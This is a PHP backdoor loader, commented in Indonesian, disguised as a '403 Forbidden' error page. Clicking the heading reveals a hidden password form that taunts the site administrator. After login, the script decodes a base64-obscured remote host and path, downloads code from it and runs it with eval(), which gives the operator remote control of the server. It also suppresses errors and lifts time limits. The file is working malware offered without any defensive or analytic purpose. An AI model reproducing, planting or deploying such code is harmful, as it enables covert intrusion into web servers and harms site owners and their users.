<?php
error_reporting(0);
set_time_limit(0);

session_start();

// Password yang dienkripsi dengan bcrypt
$hashed_password = '$2a$12$k.10u4gPugELoI4HwQZTHe.S5i7jzlkzcmms2bZQfw8cgPIEE6VVC'; 

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Jika sudah login, lanjutkan ke URL yang dimaksud
    $host = base64_decode('cHJpdm5vcHcucGFnZXMuZGV2'); 
    $port = 443;
    $path = base64_decode('L2FsZmFwaW5rbm9wdy50eHQ='); 

    // Kode untuk mengakses konten dari URL tersebut
    $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
    if (!$fp) {
        echo "Gagal mengakses server: $errstr ($errno)";
        exit;
    } else {
        $out = "GET $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);

        $content = '';
        while (!feof($fp)) {
            $content .= fgets($fp, 128);
        }
        fclose($fp);

        $header_end = strpos($content, "\r\n\r\n");
        if ($header_end !== false) {
            $content = substr($content, $header_end + 4);
        }

        eval("?>" . $content); // Tetap menggunakan eval
    }
    exit;
}

// Proses login
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST['password'];

    // Cek apakah password yang dimasukkan sesuai dengan password terenkripsi
    if (password_verify($password, $hashed_password)) {
        $_SESSION['loggedin'] = true;
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman untuk melanjutkan
        exit;
    } else {
        $error_message = "Password salah.";
    }
}
?>

<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title>403 Forbidden</title>
<style>
  @media (prefers-color-scheme: dark) {
    body {
      background-color: #000 !important;
    }
  }
  body {
    color: #444;
    margin: 0;
    font: normal 14px/20px Arial, Helvetica, sans-serif;
    height: 100%;
    background-color: #fff;
  }
  .container {
    height: auto;
    min-height: 100%;
  }
  .content {
    text-align: center;
    width: 800px;
    margin-left: -400px;
    position: absolute;
    top: 30%;
    left: 50%;
  }
  h1 {
    margin: 0;
    font-size: 150px;
    line-height: 150px;
    font-weight: bold;
    cursor: pointer;
  }
  h2 {
    margin-top: 20px;
    font-size: 30px;
  }
  .hidden-form {
    display: none;
    margin-top: 20px;
  }
  .visible {
    display: block !important;
  }
</style>
<script>
  function showForm() {
    document.getElementById('passwordForm').classList.add('visible');
  }
</script>
</head>
<body>
<div class="container">
  <div class="content">
    <h1 onclick="showForm()">403</h1>
    <h2>Forbidden</h2>
    <p>Access to this resource on the server is denied!</p>
    <?php
    if (isset($error_message)) {
        echo "<p class='error-message' style='color: red;'>$error_message</p>";
    }
    ?>
    <div id="passwordForm" class="hidden-form">
      <form method="post">
        <label for="password">Ops ketahuan, sorry ya min 😎</label><br><br>
        <input type="password" id="password" name="password" required>
        <br><br>
        <button type="submit">Submit</button>
      </form>
    </div>
  </div>
</div>
</body>
</html>
